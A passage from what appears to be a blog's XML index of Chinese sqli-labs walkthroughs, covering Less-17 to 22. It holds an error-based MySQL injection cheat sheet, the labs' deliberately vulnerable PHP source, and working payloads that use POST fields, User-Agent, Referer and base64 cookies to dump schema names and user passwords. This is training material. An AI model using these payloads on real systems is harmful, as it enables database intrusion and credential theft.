information_schema.columns where table_name=表名 and table_schema=数据库名/* 例如：select * from site_tb where 1=2 union select 1, 2, group_concat(column_name) from information_schema.columns where table_name=&apos;site_tb&apos; and table_schema=&apos;sedb&apos;; 查询数据：and 1=2 union select 1,2,3,字段1,5,字段2,7,8 from 数据库.表/* MySql报错注入假设查询语句为： select name,password from test.user where id={参数} {参数}：按照mysql语法，where后可以跟and、union，因此可以1 and (select )以及1 union select 来触发报错注入 因此插入报错语句位置如下： select colum1,colum2 from table where id={0} and {1} union {2} 使用floor/left/right：select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a; select 1 from (select concat(user(),left(rand(),3)),count(*) from information_schema.tables group by 1)a; select 1 from (select concat(user(),right(rand(),3)),count(*) from information_schema.tables group by 1)a; 例如： select name,password from user where id=1 union select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a ERROR 1062 (23000): Duplicate entry &apos;root@localhost1&apos; for key &apos;group_key&apos; 使用name_const：select 1 from (select name_const(version(),1),name_const(version(),1))x 例如： select name,password from test.user where id=1 union select 1 from (select name_const(version(),1), name_const(version(), 1))x; 使用updatexml：updatexml(1,concat(0x3a,user()),1) 例如： select name,password from test.user where id=2 and updatexml(1,concat(0x3a,user()),1); 使用extractvalue：extractvalue(1, concat(0x5c,version())) 例如： select name,password from test.user where id=2 and extractvalue(1, concat(0x5c, version())); 使用exp：exp(~(select*from(select user())x)) 例如： select name,password from test.user where id=exp(~(select*from(select user())x)); 使用GeometryCollection：GeometryCollection((select * from (select * from(select user())a)b)) polygon((select * from (select * from(select user())a)b)) multipoint((select * from (select * from(select user())a)b)) multilinestring((select * from (select * from(select user())a)b)) multipolygon((select * from (select * from(select user())a)b)) linestring((select * from (select * from(select user())a)b)) 例如： select name,password from test.user where id=2 and GeometryCollection((select * from (select * from(select user())a)b));]]></content>
      <tags>
        <tag>sql注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs-Less-17-22]]></title>
    <url>%2F2018%2F04%2F26%2Fsqli-labs-Less-17-22%2F</url>
    <content type="text"><![CDATA[Less-17 POST-Updata Query-Error Based-String基于错误的更新查询post字符注入测试页面显示 PASSWORD RESET 重置密码 uname=test&amp;passwd=test2返回页面显示重置错误 uname=admin&amp;passwd=test2返回页面显示重置密码成功 应该是用户名正确即可重置密码 页面源代码 &lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); function check_input($value) { if(!empty($value)) { // truncation (see comments) $value = substr($value,0,15); } // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) { $value = stripslashes($value); } // Quote if not a number if (!ctype_digit($value)) { $value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;; } else { $value = intval($value); } return $value; } // take the variables if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) { //making sure uname is not injectable $uname=check_input($_POST[&apos;uname&apos;]); $passwd=$_POST[&apos;passwd&apos;]; //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;User Name:&apos;.$uname.&quot;\n&quot;); fwrite($fp,&apos;New Password:&apos;.$passwd.&quot;\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); //echo $row; if($row) { //echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;; $row1 = $row[&apos;username&apos;]; //echo &apos;Your Login name:&apos;. $row1; $update=&quot;UPDATE users SET password = &apos;$passwd&apos; WHERE username=&apos;$row1&apos;&quot;; mysql_query($update); echo &quot;&lt;br&gt;&quot;; if (mysql_error()) { echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;; //echo &quot; You password has been successfully updated &quot; ; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } echo &apos;&lt;img src=&quot;../images/flag1.jpg&quot; /&gt;&apos;; //echo &apos;Your Password:&apos; .$row[&apos;password&apos;]; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; //echo &quot;Bug off you Silly Dumb hacker&quot;; echo &quot;&lt;/br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } } ?&gt; 源代码分析定义了对输入的用户名检查的函数，要求不能为空，长度为15，超过则截取15位；若开启了魔术方法，则反斜线将被去除，但是两个反斜线将会被替换成一个；纯数字检测，若为字符则用mysql_real_escape_string对其进行转义，纯数字则转换位int型返回。该函数只对用户名进行了检验，而sql语句则只验证了是否存在该用户，没有验证对应的密码 SELECT username, password FROM users WHERE username= $uname LIMIT 0,1 修改成功则返回一张包含success的图片，失败则返回失败的图片。 payload这里参考网上有三种方式对update、insert、delete进行sql注入 1、 子查询注入子查询注入即为之前说到的双查询注入（具体可以参考Less-5） uname=admin&amp;passwd=&apos; or (select 1 from(select count(*),concat((select concat(0x7e,0x27,database(),0x27,0x7e)),floor(rand()*2))x from information_schema.tables group by x)a) where username=&apos;admin&apos; %23 返回 Duplicate entry &apos;~&apos;security&apos;~0&apos; for key &apos;group_key&apos; 获取表 uname=admin&amp;passwd=&apos; or (select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) where username=&apos;admin&apos; %23 字段名 uname=admin&amp;passwd=&apos; or (select 1 from(select count(*),concat((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) where username=&apos;admin&apos;%23 获取用户信息 uname=admin&amp;passwd=&apos; or (select 1 from(select count(*),concat((select concat(0x27,id,0x7e,username,0x7e,password,0x27) from users limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) where username=&apos;admin&apos;%23 返回 Duplicate entry &apos;&apos;1~Dumb~Dumb&apos;1&apos; for key &apos;group_key&apos; 2、通过name_const():name_connsta(name,value):返回给定的值。用于生成结果集列时，NAME_CONST（）会使该列具有给定的名称。参数应该是常量。适用于低版本。 uname=admin&amp;passwd=1&apos; or (select * from (select(name_const(database(),1)),name_const(database(),1))a) where username=&apos;admin&apos;%23 报错 Incorrect arguments to NAME_CONST 数据库版本太高了 固定格式： ... or (select * from(select name_const((select ...),1),name_const((select...),1))a) ... 对于update,insert,delete都有一个固定结构：… or (select * from(select name_const((select …),1),name_const((select…),1))a) … 3、通过updatexml()payload: updatexml(1,concat(0x7e,(version())),0) updatexml(xml_target,xpath_expr,new_xml)函数： 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) 第三个参数：new_value，String格式，替换查找到的符合条件的数据作用：改变文档中符合条件的节点的值 在这里只要改变第二个参数使其报错即可，由于对第一个参数进行了过滤检查，这里对passwd字段进行注入改变XML_document中符合XPATH_string的值 payloaduname=admin&amp;passwd=a&apos; or updatexml(1,concat(0x2b,version(),0x2b),1) %23 返回 XPATH syntax error: &apos;+5.5.53+&apos; uname=admin&amp;passwd=a&apos; or updatexml(1,concat(0x2b,database(),0x2b),1) %23 返回：XPATH syntax error: &apos;+security+&apos; uname=admin&amp;passwd=a&apos; or updatexml(1,concat(0x2b,(select group_concat(schema_name) from information_schema.schemata),0x2b),1) %23 返回：XPATH syntax error: &apos;+information_schema,challenges,m&apos;在这里只返回了部分信息 获取数据库名 uname=admin&amp;passwd=a&apos; or updatexml(1,concat(0x2b,(select schema_name from information_schema.schemata limit 0,1),0x2b),1) %23 返回：XPATH syntax error: &apos;+information_schema+&apos; 获取表名 uname=admin&amp;passwd=a&apos; or updatexml(1,concat(0x2b,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),0x2b),1) %23 返回：XPATH syntax error: &apos;+emails+&apos; 获取列名 uname=admin&amp;passwd=a&apos; or updatexml(1,concat(0x2b,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),0x2b),1) %23 XPATH syntax error: &apos;+id+&apos; 获取用户信息： 1、双注入查询 uname=admin&amp;passwd=&apos; or updatexml(1,concat(0x7e,(select * from(select concat_ws(char(32,44,32),id,username,password) from users limit 7,1)a),0x7e),0)# 返回XPATH syntax error: &apos;~8 , admin , admin~&apos; 这里要注意可能由于之前的更新操作把数据库里一些密码清空了 4、extractvalue()EXTRACTVALUE (XML_document, XPath_string); 第一个参数：XML_document是String格式，为XML文档对象的名称 第二个参数：XPath_string (Xpath格式的字符串). 作用：从目标XML中返回包含所查询值的字符串适用与updatexml()相似 payloaduname=admin&amp;passwd=a&apos; or extractvalue(1,concat(0x2b,version(),0x2b)) %23 返回：XPATH syntax error: &apos;+5.5.53+&apos; uname=admin&amp;passwd=a&apos; or extractvalue(1,concat(0x2b,database(),0x2b)) %23 返回：XPATH syntax error: &apos;+security+&apos; 获取数据库名 uname=admin&amp;passwd=a&apos; or extractvalue(1,concat(0x2b,(select schema_name from information_schema.schemata limit 0,1) ,0x2b)) %23 返回：XPATH syntax error: &apos;+information_schema+&apos; 其他与updatexml()相似 Less-18 POST-Header Injection-Uagent field-Error based基于错误的对头部UserAgent的post注入测试打开页面显示IP地址 Your IP ADDRESS is: 192.168.83.140 对post参数测试没有任何反应 查看源代码&lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); function check_input($value) { if(!empty($value)) { // truncation (see comments) $value = substr($value,0,20); } // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) { $value = stripslashes($value); } // Quote if not a number if (!ctype_digit($value)) { $value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;; } else { $value = intval($value); } return $value; } $uagent = $_SERVER[&apos;HTTP_USER_AGENT&apos;]; $IP = $_SERVER[&apos;REMOTE_ADDR&apos;]; echo &quot;&lt;br&gt;&quot;; echo &apos;Your IP ADDRESS is: &apos; .$IP; echo &quot;&lt;br&gt;&quot;; //echo &apos;Your User Agent is: &apos; .$uagent; // take the variables if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) { $uname = check_input($_POST[&apos;uname&apos;]); $passwd = check_input($_POST[&apos;passwd&apos;]); /* echo &apos;Your Your User name:&apos;. $uname; echo &quot;&lt;br&gt;&quot;; echo &apos;Your Password:&apos;. $passwd; echo &quot;&lt;br&gt;&quot;; echo &apos;Your User Agent String:&apos;. $uagent; echo &quot;&lt;br&gt;&quot;; echo &apos;Your User Agent String:&apos;. $IP; */ //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;User Agent:&apos;.$uname.&quot;\n&quot;); fclose($fp); $sql=&quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;; $result1 = mysql_query($sql); $row1 = mysql_fetch_array($result1); if($row1) { echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;; $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;; mysql_query($insert); //echo &apos;Your IP ADDRESS is: &apos; .$IP; echo &quot;&lt;/font&gt;&quot;; //echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&apos;; echo &apos;Your User Agent is: &apos; .$uagent; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; print_r(mysql_error()); echo &quot;&lt;br&gt;&lt;br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&apos;; echo &quot;&lt;br&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } } ?&gt; 一开始就会回显登入的IP地址，然后对username的两个参数进行了检查过滤，所以这里测试时没有任何显示，sql语句验证了登入的账号密码是否相同，只有账号密码正确才能进行下一步的操作，可以这里是在已经注册了账号的前提下进行测试；正确登入后做了一个向security.uagents表插入useragent，ip地址，用户名的操作，再回显useragent，如果登入失败会进行报错。 $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot; 测试uname=admin&amp;passwd=admin 返回 Your IP ADDRESS is: 192.168.83.140 Your User Agent is: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0 由于对username和password进行了过滤，这里考虑对没有进行过滤操作的uagents和ip_addr进行注入测试 使用burpsuit的repeater进行测试User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0&apos; 返回 near &apos;192.168.83.140&apos;, &apos;admin&apos;)&apos; at line 1 分析：由单引号包裹，最后又括号闭合 构造payloadUser-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0&apos;,1,2)# 返回正常 Your User Agent is: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0&apos;,1,2)# 尝试在后面添加查询语句 User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0&apos;,(select database()),2)# 并没有返回我们想要的信息 使用updatexml()进行注入版本号 &apos;or updatexml(1,concat(0x2b,version(),0x2b),1))# 返回：XPATH syntax error: &apos;+5.5.53+&apos; 当前数据库名 &apos;or updatexml(1,concat(0x2b,database(),0x2b),1))# XPATH syntax error: &apos;+security+&apos; 所有数据库名 &apos;or updatexml(1,concat(0x2b,(select schema_name from information_schema.schemata limit 0,1),0x2b),1))# XPATH syntax error: &apos;+information_schema+&apos; 表名 &apos;or updatexml(1,concat(0x2b,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),0x2b),1))# XPATH syntax error: &apos;+emails+&apos; 列名 &apos;or updatexml(1,concat(0x2b,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),0x2b),1))# XPATH syntax error: &apos;+id+&apos; XPATH syntax error: &apos;+username+&apos; XPATH syntax error: &apos;+password+&apos; 获取账号信息 &apos;or updatexml(1,concat(0x2b,(select group_concat(username,password) from security.users limit 0,1),0x2b),1))# XPATH syntax error: &apos;+DumbDumb,AngelinaI-kill-you,Dum&apos; 在这里使用extractvalue()同样可以，注意是两个参数 &apos;or extractvalue(1,concat(0x2b,(select group_concat(username,password) from security.users limit 0,1),0x2b)))# XPATH syntax error: &apos;+DumbDumb,AngelinaI-kill-you,Dum&apos; Less-19 POST-Header Injection-Referer field-Error based基于错误的对头部Referer的post注入分析这里与Less-18相似，只不过注入的地方变成了referer，使用已知的账号密码登入 uname=admin&amp;passwd=admin Your IP ADDRESS is: 192.168.83.140 Your Referer is:burpsuit抓包如下 POST /sqli-labs/Less-19/ HTTP/1.1 Host: 192.168.83.141 User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate X-Forwarded-For: 123.232.23.245 CLTENT-IP: 123.232.23.245 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 24 uname=admin&amp;passwd=admin 我们看到上述请求中并没有referer这里使用hackbar或burpsuit直接在请求中添加 Referer: https://localhost/sql-labs/Less-19&apos;or updatexml(1,concat(0x2b,version(),0x2b),1))# XPATH syntax error: &apos;+5.5.53+&apos; 其他同上 在使用hackbar测试时遇到了一些麻烦，注释符号# 和–一直不起作用，抓包后发现没有了注释符#虽然有–，担不起作用，使用%23，这里的编码问题 Less-20 POST-Cookie injection-Uagent field-error based基于错误的对头部cookie的post注入测试uname=admin&amp;passwd=admin 返回 YOUR USER AGENT IS : Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0 YOUR IP ADDRESS IS : 192.168.83.140 DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE YOUR COOKIE : uname = admin and expires: Thu 26 Apr 2018 - 02:45:27 Your Login name:admin Your Password:admin Your ID:8 这里将一些关键信息都显示了，注意下面有个按钮 Delete You cookie! ,点击后直接跳转到登入页面，可以推测应该有一个对cookie进行操作的过程 burpsuit抓取删除cookie操作的数据包POST /sqli-labs/Less-20/index.php HTTP/1.1 Host: 192.168.83.141 User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://192.168.83.141/sqli-labs/Less-20/index.php Cookie: uname=admin X-Forwarded-For: 123.232.23.245 CLTENT-IP: 123.232.23.245 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 28 submit=Delete+Your+Cookie%21 源代码&lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); if(!isset($_COOKIE[&apos;uname&apos;])) { //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); echo &quot;&lt;div style=&apos; margin-top:20px;color:#FFF; font-size:24px; text-align:center&apos;&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&apos;#FF0000&apos;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;&quot;; echo &quot;&lt;div align=&apos;center&apos; style=&apos;margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;&apos;&gt;&quot;; echo &quot;&lt;div style=&apos;padding-top:10px; font-size:15px;&apos;&gt;&quot;; echo &quot;&lt;!--Form to post the contents --&gt;&quot;; echo &apos;&lt;form action=&quot; &quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;&apos;; echo &apos; &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;&apos;; echo &apos; &lt;input type=&quot;text&quot; name=&quot;uname&quot; value=&quot;&quot;/&gt; &lt;/div&gt;&apos;; echo &apos; &lt;div&gt; Password : &amp;nbsp; &amp;nbsp; &amp;nbsp;&apos;; echo &apos; &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;&lt;/div&gt;&lt;/br&gt;&apos;; echo &apos; &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&apos;; echo &apos;&lt;/form&gt;&apos;; echo &apos;&lt;/div&gt;&apos;; echo &apos;&lt;/div&gt;&apos;; echo &apos;&lt;div style=&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;&apos;; echo &apos;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;; echo &apos;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&apos;; echo &apos;&lt;/center&gt;&apos;; function check_input($value) { if(!empty($value)) { $value = substr($value,0,20); // truncation (see comments) } if (get_magic_quotes_gpc()) // Stripslashes if magic quotes enabled { $value = stripslashes($value); } if (!ctype_digit($value)) // Quote if not a number { $value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;; } else { $value = intval($value); } return $value; } echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) { $uname = check_input($_POST[&apos;uname&apos;]); $passwd = check_input($_POST[&apos;passwd&apos;]); $sql=&quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;; $result1 = mysql_query($sql); $row1 = mysql_fetch_array($result1); $cookee = $row1[&apos;username&apos;]; if($row1) { echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;; setcookie(&apos;uname&apos;, $cookee, time()+3600); header (&apos;Location: index.php&apos;); echo &quot;I LOVE YOU COOKIES&quot;; echo &quot;&lt;/font&gt;&quot;; echo &apos;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&apos;; //echo &apos;Your Cookie is: &apos; .$cookee; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; print_r(mysql_error()); echo &quot;&lt;br&gt;&lt;br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&apos;; echo &quot;&lt;br&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } } echo &quot;&lt;/font&gt;&quot;; echo &apos;&lt;/font&gt;&apos;; echo &apos;&lt;/div&gt;&apos;; } else { if(!isset($_POST[&apos;submit&apos;])) { $cookee = $_COOKIE[&apos;uname&apos;]; $format = &apos;D d M Y - H:i:s&apos;; $timestamp = time() + 3600; echo &quot;&lt;center&gt;&quot;; echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;; echo &apos;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&apos;; echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;; echo &apos;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&apos;; echo &quot;YOUR USER AGENT IS : &quot;.$_SERVER[&apos;HTTP_USER_AGENT&apos;]; echo &quot;&lt;/font&gt;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&apos;; echo &quot;YOUR IP ADDRESS IS : &quot;.$_SERVER[&apos;REMOTE_ADDR&apos;]; echo &quot;&lt;/font&gt;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&apos;; echo &quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;orange&quot; font size = 5 &gt;&apos;; echo &quot;YOUR COOKIE : uname = $cookee and expires: &quot; . date($format, $timestamp); echo &quot;&lt;br&gt;&lt;/font&gt;&quot;; $sql=&quot;SELECT * FROM users WHERE username=&apos;$cookee&apos; LIMIT 0,1&quot;; $result=mysql_query($sql); if (!$result) { die(&apos;Issue with your mysql: &apos; . mysql_error()); } $row = mysql_fetch_array($result); if($row) { echo &apos;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&apos;; echo &apos;Your Login name:&apos;. $row[&apos;username&apos;]; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&apos;; echo &apos;Your Password:&apos; .$row[&apos;password&apos;]; echo &quot;&lt;/font&gt;&lt;/b&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &apos;Your ID:&apos; .$row[&apos;id&apos;]; } else { echo &quot;&lt;center&gt;&quot;; echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;; echo &apos;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&apos;; echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;; //echo &apos;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&apos;; } echo &apos;&lt;center&gt;&apos;; echo &apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos;; echo &apos;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&apos;; echo &apos;&lt;/form&gt;&apos;; echo &apos;&lt;/center&gt;&apos;; } else { echo &apos;&lt;center&gt;&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 6 &gt;&apos;; echo &quot; Your Cookie is deleted&quot;; setcookie(&apos;uname&apos;, $row1[&apos;username&apos;], time()-3600); header (&apos;Location: index.php&apos;); echo &apos;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&apos;; } echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; //header (&apos;Location: main.php&apos;); echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; //echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&lt;/center&gt;&apos;; //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;Cookie:&apos;.$cookee.&quot;\n&quot;); fclose($fp); } ?&gt; 分析1、判断cookie是否存在，不存在则进行登入验证 2、登入时对uname,passwd先进行过滤，过滤后验证是否正确，将变量cookie赋值为username，设置cookie为uname+time()+3600 3、没点击submit按钮，则显示详细信息，包括user agent、IP、cookie,查询对应cookie的账号密码并显示 4、若点击了submit按钮，重置cookie，并重定向到登入页面 关键代码，对cookie对应的用户进行了查询，且变量$cookee并未进行过滤，而该变量的值是由username传递而来 $sql=&quot;SELECT * FROM users WHERE username=&apos;$cookee&apos; LIMIT 0,1&quot;; payload添加单引号测试 Cookie: uname=admin&apos; 返回：near &apos;&apos;admin&apos;&apos; LIMIT 0,1&apos; at line 1由单引号包裹 admin&apos;or 1=1# 返回正常 遍历数据库名 admin&apos;or updatexml(1,concat(0x2b,(select schema_name from information_schema.schemata limit 0,1),0x2b),1)# XPATH syntax error: &apos;+information_schema+&apos; 其他同上 Less-21 Cookie Injection- Error Based- complex - stringLess-21与Less-20的不同之处在于cookie对uname进行了bse64编码 setcookie(&apos;uname&apos;, base64_encode($row1[&apos;username&apos;]), time()+3600); 测试uname=admin&apos;经过base64编码后 uname=YWRtaW4n near &apos;&apos;admin&apos;&apos;) LIMIT 0,1&apos; at line 1 可以看到由单引号和括号包裹 admin&apos; or 1=1)# YWRtaW4nIG9yIDE9MSkj返回正常 构造payload遍历系统数据库名 admin&apos; or updatexml(1,concat(0x2b,(select schema_name from information_schema.schemata limit 0,1),0x2b),1))# YWRtaW4nIG9yIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDJiLChzZWxlY3Qgc2NoZW1hX25hbWUgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuc2NoZW1hdGEgbGltaXQgMCwxKSwweDJiKSwxKSkj 返回XPATH syntax error: &apos;+information_schema+&apos; 其他同上 Less-22 Cookie Injection- Error Based- Double Quotes - string测试uname=admin&apos; uname=YWRtaW4n 未报错 admin&quot; YWRtaW4i near &apos;&quot;admin&quot;&quot; LIMIT 0,1&apos; at line 1 由双引号包裹 admin&quot; or 1=1# YWRtaW4iIG9yIDE9MSM=返回正常 构造payloadadmin&quot; or updatexml(1,concat(0x2b,(select schema_name from information_schema.schemata limit 0,1),0x2b),1)# YWRtaW4iIG9yIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDJiLChzZWxlY3Qgc2NoZW1hX25hbWUgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuc2NoZW1hdGEgbGltaXQgMCwxKSwweDJiKSwxKSM= XPATH syntax error: &apos;+information_schema+&apos; 其他同上 参考 SQLi-Labs 学习笔记]]></content>
      <tags>
        <tag>sql注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs-Less-11-16]]></title>
    <url>%2F2018%2F04%2F23%2Fsqli-labs-Less-11-16%2F</url>
